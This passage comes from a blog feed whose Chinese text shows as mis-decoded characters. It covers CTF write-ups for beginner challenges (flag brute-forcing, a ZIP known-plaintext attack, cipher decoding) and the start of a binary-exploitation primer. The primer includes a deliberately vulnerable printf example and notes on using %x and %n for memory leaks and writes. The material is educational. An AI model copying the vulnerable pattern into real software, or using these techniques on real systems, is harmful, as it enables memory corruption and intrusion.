mei!</h3><p>å‘ç°ä¸Šæ¬¡æ–°ç”Ÿèµ›çš„é¢˜è¿˜æ²¡åˆ é™¤ï¼Œå°±å†™ä¸€ä¸‹wpå§</p><p>æ‰“å¼€é¢˜ç›®æ˜¯è¿™æ ·çš„</p><p><img src="/2019/08/15/drops-new-2019/20190813145734.png"></p><p>bpæŠ“åŒ…çœ‹ä¸‹å§ï¼Œå¥½åƒæ²¡ä»€ä¹ˆæç¤ºï¼Œdirseachæ‰«ä¸‹ï¼Œå‘ç°æœ‰ä¸ªindex.php,ä½†æ˜¯è·³è½¬åˆ°flag1.phpäº†ï¼Œå†æŠ“åŒ…æ¥çœ‹ä¸‹å§</p><p><img src="/2019/08/15/drops-new-2019/20190813150033.png"></p><p>å‘ç°æç¤ºï¼š<code>flag200.php</code>ï¼Œè®¿é—®ä¸‹å‘ç°è¿˜æ˜¯å’Œ<code>flag1.php</code>ä¸€æ ·ï¼Œè¯•ç€kï¼Œå‘ç°å°±403äº†ï¼Œè€Œ200ä¹‹å‰çš„å¥½åƒéƒ½å­˜åœ¨ï¼Œbpçˆ†ç ´ä¸€ä¸‹å§</p><p><img src="/2019/08/15/drops-new-2019/20190813150447.png"></p><p><code>flag157.php</code>çš„é•¿åº¦æ˜¾ç„¶ä¸åŒï¼Œçœ‹ä¸‹å“åº”å¤´ï¼Œflagåˆ°æ‰‹</p><pre><code>flag&#123;really_beaut1ful~&#125;</code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="The-Wonderful-Wizard"><a href="#The-Wonderful-Wizard" class="headerlink" title="The Wonderful Wizard"></a>The Wonderful Wizard</h3><p>Stegsolveæ‰“å¼€ï¼Œåˆ‡æ¢ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°flag,æ˜¯16è¿›åˆ¶çš„è½¬æˆå­—ç¬¦å°±è¡Œ</p><h3 id="easy-image"><a href="#easy-image" class="headerlink" title="easy image"></a>easy image</h3><p>æ‰«æäºŒç»´ç </p><h3 id="ç¥å¥‡çš„å‹ç¼©åŒ…"><a href="#ç¥å¥‡çš„å‹ç¼©åŒ…" class="headerlink" title="ç¥å¥‡çš„å‹ç¼©åŒ…"></a>ç¥å¥‡çš„å‹ç¼©åŒ…</h3><p>æœ¬é¢˜æºè‡ªbugkuæ‚é¡¹ç¥ç§˜çš„æ–‡ä»¶ï¼Œåšé¢˜æ–¹æ³•æ˜¯æ˜æ–‡æ”»å‡»</p><p>è§£å‹é¢˜ç›®ï¼Œå‘ç°æœ‰flag.zipå’Œlogo.pngä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”flag.zipæ˜¯åŠ å¯†çš„ï¼Œé‡Œé¢æœ‰ä¹Ÿæœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªdocxæ–‡ä»¶å’Œlogo.png</p><p><img src="/2019/08/15/drops-new-2019/20190809225716.png"></p><p>è¿™æ—¶æˆ‘ä»¬æƒ³åˆ°äº†æ˜æ–‡æ”»å‡»ï¼Œå°†logo.pngæ·»åŠ åˆ°å‹ç¼©æ–‡ä»¶ï¼Œç„¶åå°±ç”¨åˆ°ARCHPRäº†ï¼Œæ³¨æ„ï¼Œè¯·æ³¨æ„CRCä¸€å®šè¦ç›¸åŒæ‰èƒ½ç”¨ARCHPRæ˜æ–‡æ”»å‡»ï¼Œå¦åˆ™ä¼šæŠ¥é”™(ç¬¬äºŒå¼ å›¾)ï¼š</p><p><img src="/2019/08/15/drops-new-2019/20190809230550.png"></p><p><img src="/2019/08/15/drops-new-2019/20190809230834.png"></p><p>çˆ†ç ´ç»“æœå‡ºæ¥</p><p><img src="/2019/08/15/drops-new-2019/20190809231341.png"></p><p>è¾“å…¥å£ä»¤è§£å‹ï¼Œå°†docxæ–‡ä»¶æ‹–åˆ°è™šæ‹Ÿæœºbinwalkåˆ†ç¦»ä¸€ä¸‹ï¼Œå¾—åˆ°flag.txt,base64è§£ç å¾—åˆ°flag</p><p><img src="/2019/08/15/drops-new-2019/20190809231906.png"></p><pre><code>flag&#123;d0cX_1s_ziP_file&#125;</code></pre><h3 id="æ”¾æ¾ä¸€ä¸‹"><a href="#æ”¾æ¾ä¸€ä¸‹" class="headerlink" title="æ”¾æ¾ä¸€ä¸‹"></a>æ”¾æ¾ä¸€ä¸‹</h3><p>æ‘©æ–¯ç”µç </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h3><p>ç”¨uncompyle6åç¼–è¯‘.pyæ–‡ä»¶ï¼Œæ”¹ä¸‹æºç </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>ascciç è½¬å­—ç¬¦</p><h3 id="Alphabet"><a href="#Alphabet" class="headerlink" title="Alphabet"></a>Alphabet</h3><p>ç™¾åº¦ä¸€ä¸‹æ˜¯å­—æ¯è¡¨çš„æ„æ€ï¼Œæ‰“å¼€ä¹‹åæ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2019/08/15/drops-new-2019/20190810175851.png"></p><p>æˆ‘ä»¬å¯ä»¥æƒ³åˆ°å‰é¢çš„Alphabetåº”è¯¥ä¸æ˜¯åŠ å¯†çš„å†…å®¹ï¼Œç„¶ååé¢è·Ÿäº†ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œå¯ä»¥çœ‹åˆ°æœ‰{}è¿™ä¸¤ä¸ªç¬¦å·ï¼Œå‰é¢ä¸€ä¸²æ˜¯å¤§å†™å­—æ¯ï¼Œåé¢æ˜¯å°å†™å­æ¯ï¼Œå¹¶ä¸”{å‰çš„å°å†™å­—æ¯åˆšå¥½æ˜¯å››ä¸ªï¼Œå¤§å†™å­—æ¯åˆšä¸º26ä¸ª</p><p>ä¸æ‰¯äº†ï¼Œè¿™é¢˜çš„è§£æ³•å°±æ˜¯å‰é¢çš„26å¤§å†™å­—æ¯ï¼Œåˆ†åˆ«å¯¹åº”ç€å­—æ¯è¡¨çš„26ä¸ªå­—æ¯ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æ‰¾åˆ°åé¢çš„ä¸€ä¸²å°å†™å­—æ¯åœ¨å‰é¢å¤§å†™å­—æ¯çš„åºå·ï¼Œå’ŒçœŸå®çš„å­—æ¯è¡¨ä¸€ä¸€å¯¹åº”å°±å¯ä»¥å¾—åˆ°flag,å¥‰ä¸Šè§£å¯†è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tr&#x3D;&quot;WCGPSUHRAQYKFDLZOJNXMVEBT&quot;</span><br><span class="line">secert&#x3D;&quot;ukwh&#123;ljwdhsqmags&#125;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for s in secert:</span><br><span class="line">    if s!&#x3D;&quot;&#123;&quot; and s!&#x3D;&quot;&#125;&quot;:</span><br><span class="line">        num&#x3D;tr.index(s.upper())</span><br><span class="line">        flag+&#x3D;chr(num+ord(&quot;a&quot;))</span><br><span class="line">    else:</span><br><span class="line">        flag+&#x3D;s</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flagä¹Ÿå¥‰ä¸Š</p><pre><code>flag&#123;orangejuice&#125;</code></pre><h3 id="å¯Œå¼ºæ°‘ä¸»"><a href="#å¯Œå¼ºæ°‘ä¸»" class="headerlink" title="å¯Œå¼ºæ°‘ä¸»"></a>å¯Œå¼ºæ°‘ä¸»</h3><p>ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚è§£ç </p><h3 id="babyâ€™s-baby-rsa"><a href="#babyâ€™s-baby-rsa" class="headerlink" title="babyâ€™s baby rsa"></a>babyâ€™s baby rsa</h3><pre><code>M=Cd%n</code></pre><p>å¥—å…¬å¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå…¥é—¨åŸºæœ¬çŸ¥è¯†</title>
      <link href="2019/07/22/pwn-base/"/>
      <url>2019/07/22/pwn-base/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢è®°å½•äº†å­¦ä¹ pwnå…¥é—¨çš„ä¸€äº›ä¸œè¥¿ï¼ŒåŒ…æ‹¬ä¸€äº›å¸¸è§æ¦‚å¿µå’Œå¸¸è§æ¼æ´åŠåˆ©ç”¨æ–¹æ³•</p><a id="more"></a><h2 id="ä¸€äº›æ¦‚å¿µ"><a href="#ä¸€äº›æ¦‚å¿µ" class="headerlink" title="ä¸€äº›æ¦‚å¿µ"></a>ä¸€äº›æ¦‚å¿µ</h2><h3 id="æ–‡ä»¶æ®µï¼š"><a href="#æ–‡ä»¶æ®µï¼š" class="headerlink" title="æ–‡ä»¶æ®µï¼š"></a>æ–‡ä»¶æ®µï¼š</h3><pre><code>bssæ®µï¼šï¼ˆæœªæ‰‹åŠ¨åˆå§‹åŒ–çš„æ•°æ®ï¼‰å¹¶ä¸ç»™è¯¥æ®µçš„æ•°æ®åˆ†é…ç©ºé—´ï¼Œåªæ˜¯è®°å½•æ•°æ®æ‰€éœ€ç©ºé—´çš„å¤§å°dataæ®µï¼šï¼ˆå·²æ‰‹åŠ¨åˆå§‹åŒ–çš„æ•°æ®ï¼‰æ®µåˆ™ä¸ºæ•°æ®åˆ†é…ç©ºé—´ï¼Œæ•°æ®ä¿å­˜åœ¨ç›®æ ‡æ–‡ä»¶ä¸­textæ®µï¼šä»£ç æ®µï¼ˆcode segment/text segmentï¼‰é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºæ‰§è¡Œä»£ç çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚è¿™éƒ¨åˆ†åŒºåŸŸçš„å¤§å°åœ¨ç¨‹åºè¿è¡Œå‰å°±å·²ç»ç¡®å®šï¼Œå¹¶ä¸”å†…å­˜åŒºåŸŸé€šå¸¸å±äºåªè¯»(æŸäº›æ¶æ„ä¹Ÿå…è®¸ä»£ç æ®µä¸ºå¯å†™ï¼Œå³å…è®¸ä¿®æ”¹ç¨‹åº)ã€‚åœ¨ä»£ç æ®µä¸­ï¼Œä¹Ÿæœ‰å¯èƒ½åŒ…å«ä¸€äº›åªè¯»çš„å¸¸æ•°å˜é‡ï¼Œä¾‹å¦‚å­—ç¬¦ä¸²å¸¸é‡ç­‰å †ï¼ˆheapï¼‰ï¼šå †æ˜¯ç”¨äºå­˜æ”¾è¿›ç¨‹è¿è¡Œä¸­è¢«åŠ¨æ€åˆ†é…çš„å†…å­˜æ®µï¼Œå®ƒçš„å¤§å°å¹¶ä¸å›ºå®šï¼Œå¯åŠ¨æ€æ‰©å¼ æˆ–ç¼©å‡ã€‚å½“è¿›ç¨‹è°ƒç”¨mallocç­‰å‡½æ•°åˆ†é…å†…å­˜æ—¶ï¼Œæ–°åˆ†é…çš„å†…å­˜å°±è¢«åŠ¨æ€æ·»åŠ åˆ°å †ä¸Šï¼ˆå †è¢«æ‰©å¼ ï¼‰ï¼›å½“åˆ©ç”¨freeç­‰å‡½æ•°é‡Šæ”¾å†…å­˜æ—¶ï¼Œè¢«é‡Šæ”¾çš„å†…å­˜ä»å †ä¸­è¢«å‰”é™¤ï¼ˆå †è¢«ç¼©å‡ï¼‰æ ˆ(stack)ï¼šæ ˆåˆç§°å †æ ˆï¼Œæ˜¯ç”¨æˆ·å­˜æ”¾ç¨‹åºä¸´æ—¶åˆ›å»ºçš„å±€éƒ¨å˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å‡½æ•°æ‹¬å¼§â€œ&#123;&#125;â€ä¸­å®šä¹‰çš„å˜é‡ï¼ˆä½†ä¸åŒ…æ‹¬staticå£°æ˜çš„å˜é‡ï¼Œstaticæ„å‘³ç€åœ¨æ•°æ®æ®µä¸­å­˜æ”¾å˜é‡ï¼‰ã€‚é™¤æ­¤ä»¥å¤–ï¼Œåœ¨å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå…¶å‚æ•°ä¹Ÿä¼šè¢«å‹å…¥å‘èµ·è°ƒç”¨çš„è¿›ç¨‹æ ˆä¸­ï¼Œå¹¶ä¸”å¾…åˆ°è°ƒç”¨ç»“æŸåï¼Œå‡½æ•°çš„è¿”å›å€¼ä¹Ÿä¼šè¢«å­˜æ”¾å›æ ˆä¸­ã€‚ç”±äºæ ˆçš„å…ˆè¿›å…ˆå‡º(FIFO)ç‰¹ç‚¹ï¼Œæ‰€ä»¥æ ˆç‰¹åˆ«æ–¹ä¾¿ç”¨æ¥ä¿å­˜/æ¢å¤è°ƒç”¨ç°åœºã€‚</code></pre><h3 id="å¸¸è§å¯„å­˜å™¨"><a href="#å¸¸è§å¯„å­˜å™¨" class="headerlink" title="å¸¸è§å¯„å­˜å™¨"></a>å¸¸è§å¯„å­˜å™¨</h3><pre><code>esp:ç”¨æ¥å­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆçš„æ ˆé¡¶åœ°å€ï¼Œåœ¨å‹æ ˆå’Œé€€æ ˆæ—¶å‘ç”Ÿå˜åŒ–ebp:ç”¨æ¥å­˜å‚¨å½“å‰å‡½æ•°çŠ¶æ€çš„åŸºåœ°å€ï¼Œåœ¨å‡½æ•°è¿è¡Œæ—¶ä¸å˜ï¼Œå¯ä»¥ç”¨æ¥ç´¢å¼•ç¡®å®šå‡½æ•°å‚æ•°æˆ–å±€éƒ¨å˜é‡çš„ä½ç½®eip:ç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€ï¼Œcpu ä¾ç…§ eip çš„å­˜å‚¨å†…å®¹è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œï¼Œeip éšä¹‹æŒ‡å‘ç›¸é‚»çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå¦‚æ­¤åå¤ï¼Œç¨‹åºå°±å¾—ä»¥è¿ç»­æ‰§è¡ŒæŒ‡ä»¤</code></pre><h2 id="å‡½æ•°è°ƒç”¨æ—¶æ ˆçš„å˜åŒ–"><a href="#å‡½æ•°è°ƒç”¨æ—¶æ ˆçš„å˜åŒ–" class="headerlink" title="å‡½æ•°è°ƒç”¨æ—¶æ ˆçš„å˜åŒ–"></a>å‡½æ•°è°ƒç”¨æ—¶æ ˆçš„å˜åŒ–</h2><ol><li><p>é¦–å…ˆå°†è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•°æŒ‰ç…§é€†åºä¾æ¬¡å‹å…¥æ ˆå†…ï¼Œæ²¡æœ‰å‚æ•°åˆ™æ²¡æœ‰è¿™ä¸€æ­¥</p></li><li><p>å°†è¢«è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€å‹å…¥æ ˆå†…</p></li><li><p>å°†è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼ˆebpï¼‰å‹å…¥æ ˆå†…ï¼Œå¹¶å°†å½“å‰æ ˆé¡¶åœ°å€ä¼ åˆ° ebp å¯„å­˜å™¨å†…</p></li><li><p>å°†è¢«è°ƒç”¨å‡½æ•°çš„å±€éƒ¨å˜é‡å‹å…¥æ ˆå†…</p></li><li><p>å°†è¢«è°ƒç”¨å‡½æ•°çš„å±€éƒ¨å˜é‡å¼¹å‡ºæ ˆå¤–</p></li><li><p>å°†è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼ˆebpï¼‰å¼¹å‡ºæ ˆå¤–ï¼Œå¹¶å­˜åˆ° ebp å¯„å­˜å™¨å†…</p></li><li><p>å°†è¢«è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€å¼¹å‡ºæ ˆå¤–ï¼Œå¹¶å­˜åˆ° eip å¯„å­˜å™¨å†…</p></li></ol><h2 id="GOTå’ŒPLTè¡¨"><a href="#GOTå’ŒPLTè¡¨" class="headerlink" title="GOTå’ŒPLTè¡¨"></a>GOTå’ŒPLTè¡¨</h2><p>GOT å…¨ç§°æ˜¯å…¨å±€åç§»é‡è¡¨ï¼ˆGlobal Offset Tableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜çš„ç¡®åˆ‡åœ°å€ã€‚GOT å­˜å‚¨åœ¨æ•°æ®æ®µï¼ˆData Segmentï¼‰å†…ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œä¸­è¢«ä¿®æ”¹ã€‚PLT å…¨ç§°æ˜¯ç¨‹åºé“¾æ¥è¡¨ï¼ˆProcedure Linkage Tableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„å…¥å£ç‚¹ï¼ˆentryï¼‰ï¼Œæ¢è¨€ä¹‹ç¨‹åºæ€»ä¼šåˆ° PLT è¿™é‡Œå¯»æ‰¾å¤–éƒ¨å‡½æ•°çš„åœ°å€ã€‚PLT å­˜å‚¨åœ¨ä»£ç æ®µï¼ˆCode Segmentï¼‰å†…ï¼Œåœ¨è¿è¡Œä¹‹å‰å°±å·²ç»ç¡®å®šå¹¶ä¸”ä¸ä¼šè¢«ä¿®æ”¹ï¼Œæ‰€ä»¥ PLT å¹¶ä¸ä¼šçŸ¥é“ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€é“¾æ¥åº“è¢«åŠ è½½çš„ç¡®åˆ‡ä½ç½®ã€‚PLT è¡¨å†…å­˜å‚¨çš„å…¥å£ç‚¹å°±æ˜¯ GOT è¡¨ä¸­å¯¹åº”æ¡ç›®çš„åœ°å€ã€‚</p><h2 id="ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶"><a href="#ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶" class="headerlink" title="ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶"></a>ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶</h2><h3 id="CANNARY-æ ˆä¿æŠ¤"><a href="#CANNARY-æ ˆä¿æŠ¤" class="headerlink" title="CANNARY(æ ˆä¿æŠ¤)"></a>CANNARY(æ ˆä¿æŠ¤)</h3><p>è¿™ä¸ªé€‰é¡¹è¡¨ç¤ºæ ˆä¿æŠ¤åŠŸèƒ½æœ‰æ²¡æœ‰å¼€å¯ã€‚<br>æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®©shellcodeèƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚</p><h3 id="PIEï¼ˆASLRï¼‰"><a href="#PIEï¼ˆASLRï¼‰" class="headerlink" title="PIEï¼ˆASLRï¼‰"></a>PIEï¼ˆASLRï¼‰</h3><p>ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆWindowså¹³å°ä¸Šç§°å…¶ä¸ºDEPï¼‰å’Œåœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ï¼ˆASLRï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚<br>å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶ï¼ˆaddress space layout randomization)ï¼Œæœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µ:</p><pre><code>0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚</code></pre><p>å¯ä»¥é˜²èŒƒåŸºäºRet2libcæ–¹å¼çš„é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œèƒ½æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç ã€‚</p><h3 id="NXï¼ˆDEPï¼‰-æ•°æ®æ‰§è¡Œä¿æŠ¤-Data-Execution-Prevention"><a href="#NXï¼ˆDEPï¼‰-æ•°æ®æ‰§è¡Œä¿æŠ¤-Data-Execution-Prevention" class="headerlink" title="NXï¼ˆDEPï¼‰(æ•°æ®æ‰§è¡Œä¿æŠ¤ Data Execution Prevention)"></a>NXï¼ˆDEPï¼‰(æ•°æ®æ‰§è¡Œä¿æŠ¤ Data Execution Prevention)</h3><p>NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><p>åœ¨å®‰è£…è¿‡pwntoolsç»ˆç«¯è¾“å…¥checksec+æ–‡ä»¶å</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><p><strong>åŸå› ï¼š</strong><br>æ­£ç¡®ä½¿ç”¨printfæ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int n&#x3D;5;</span><br><span class="line">  printf(&quot;%d&quot;,n);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæœ‰äººè¿™æ ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[]&#x3D;&quot;neuqcsa&quot;;</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœå°†å­—ç¬¦ä¸²çš„è¾“å…¥æƒäº¤ç»™ç”¨æˆ·å°±ä¼šæœ‰é—®é¢˜äº†ã€‚çœ‹ä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯â€%x%x%xâ€ï¼Œåˆ™ä¼šè¾“å‡ºä»¥ä¸‹ç»“æœï¼š</p><p><img src="/2019/07/22/pwn-base/20181208232026599.png"></p><p>å›¾ç‰‡ä¸Šæ˜¾ç¤ºçš„æ˜¯å†…å­˜çš„æ•°æ®ï¼Œä»¥ä¸Šå°±æ˜¯äº§ç”Ÿæ¼æ´çš„åŸå› äº†</p><p>ä¸€äº›å‚æ•°:</p><pre><code>%cï¼šè¾“å‡ºå­—ç¬¦ï¼Œé…ä¸Š%nå¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚%dï¼šè¾“å‡ºåè¿›åˆ¶æ•´æ•°ï¼Œé…ä¸Š%nå¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚%xï¼šè¾“å‡º16è¿›åˆ¶æ•°æ®ï¼Œå¦‚%i$xè¡¨ç¤ºè¦æ³„æ¼åç§»iå¤„4å­—èŠ‚é•¿çš„16è¿›åˆ¶æ®ï¼Œ    %i$lxè¡¨ç¤ºè¦æ³„æ¼åç§»iå¤„8å­—èŠ‚é•¿çš„16è¿›åˆ¶æ•°æ®ï¼Œ32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ã€‚%pï¼šè¾“å‡º16è¿›åˆ¶æ•°æ®ï¼Œä¸%xåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯é™„åŠ äº†å‰ç¼€0xï¼Œåœ¨32bitä¸‹è¾“å‡º4å­—èŠ‚ï¼Œ    åœ¨64bitä¸‹è¾“å‡º8å­—èŠ‚ï¼Œå¯é€šè¿‡è¾“å‡ºå­—èŠ‚çš„é•¿åº¦æ¥åˆ¤æ–­ç›®æ ‡ç¯å¢ƒæ˜¯32bitè¿˜æ˜¯64bitã€‚%sï¼šè¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå³å°†åç§»å¤„æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œ    å¦‚%i$sè¡¨ç¤ºè¾“å‡ºåç§»iå¤„åœ°å€æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œ    åœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ï¼Œå¯ç”¨äºè¯»å–GOTè¡¨ç­‰ä¿¡æ¯ã€‚%nï¼šå°†%nä¹‹å‰printfå·²ç»æ‰“å°çš„å­—ç¬¦ä¸ªæ•°èµ‹å€¼ç»™åç§»å¤„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ä½ç½®ï¼Œ    å¦‚%100Ã—10$nè¡¨ç¤ºå°†0x64å†™å…¥åç§»10å¤„ä¿å­˜çš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œ    è€Œ%$hnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º2å­—èŠ‚ï¼Œ    %$hhnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º1å­—èŠ‚ï¼Œ    %$llnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º8å­—èŠ‚ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ã€‚    æœ‰æ—¶ï¼Œç›´æ¥å†™4å­—èŠ‚ä¼šå¯¼è‡´ç¨‹åºå´©æºƒæˆ–ç­‰å€™æ—¶é—´è¿‡é•¿ï¼Œå¯ä»¥é€šè¿‡%$hnæˆ–%$hhnæ¥é€‚æ—¶è°ƒæ•´ã€‚    %næ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ”¹å˜ç¨‹åºæµç¨‹çš„å…³é”®æ–¹å¼ï¼Œ    